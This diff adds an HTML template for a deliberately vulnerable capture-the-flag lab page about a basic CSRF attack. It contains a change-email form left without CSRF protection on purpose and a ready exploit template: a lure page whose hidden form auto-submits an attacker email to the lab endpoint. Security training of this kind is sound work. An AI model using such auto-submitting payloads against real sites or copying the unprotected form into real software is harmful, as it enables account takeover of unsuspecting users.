@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Basic CSRF - EliteHackLab</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+</head>
+<body>
+  <div class="matrix-bg"></div>
+  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a><a href="/labs/csrf"><i class="fas fa-flask"></i> CSRF Labs</a></div></nav>
+  <div class="lab-container">
+    <div class="lab-header">
+      <div class="breadcrumb"><a href="/">Home</a> / <a href="/labs/csrf">CSRF</a> / Basic</div>
+      <h1>🔄 Basic CSRF Attack</h1>
+      <div class="lab-info"><span class="lab-tag difficulty-easy">Easy</span><span class="lab-tag points"><i class="fas fa-star"></i> 10 pts</span></div>
+    </div>
+    <div class="lab-section">
+      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
+      <p>The change-email form has NO CSRF protection. Craft an HTML page that, when opened by the victim (admin), will change their email without their knowledge.</p>
+      <p><strong>Current user:</strong> <%= user.username %> | <strong>Email:</strong> <%= user.email %></p>
+    </div>
+    <div class="lab-section">
+      <h2><i class="fas fa-terminal"></i> Change Email (No CSRF Token)</h2>
+      <form method="POST" action="/labs/csrf/basic/change-email" class="vulnerable-form">
+        <label>New Email:</label>
+        <input type="email" name="email" placeholder="new@evil.com" autocomplete="off">
+        <button type="submit">Change Email</button>
+      </form>
+      <% if (message) { %><div class="success-box"><%= message %></div><% } %>
+    </div>
+    <div class="lab-section">
+      <h2><i class="fas fa-code"></i> CSRF Exploit Template</h2>
+      <div class="code-block">&lt;!-- Save as evil.html and open in browser --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;h1&gt;You won a prize! Click below:&lt;/h1&gt;
+  &lt;form action="http://localhost:3000/labs/csrf/basic/change-email" method="POST" id="csrfForm"&gt;
+    &lt;input type="hidden" name="email" value="hacker@evil.com"&gt;
+  &lt;/form&gt;
+  &lt;script&gt;document.getElementById('csrfForm').submit();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</div>
+    </div>
+    <div class="flag-submit">
+      <h3><i class="fas fa-flag"></i> Capture The Flag</h3>
+      <form onsubmit="submitFlagInline('csrf-basic', 'flagInput_csrf', 'flagResult_csrf'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;">
+        <input type="text" id="flagInput_csrf" placeholder="FLAG{...}" autocomplete="off">
+        <button type="submit" class="btn">Submit</button>
+      </form>
+      <div id="flagResult_csrf" style="display:none; margin-top:1rem;"></div>
+    </div>
+  </div>
+  <script src="/js/main.js"></script>
+</body>
+</html>
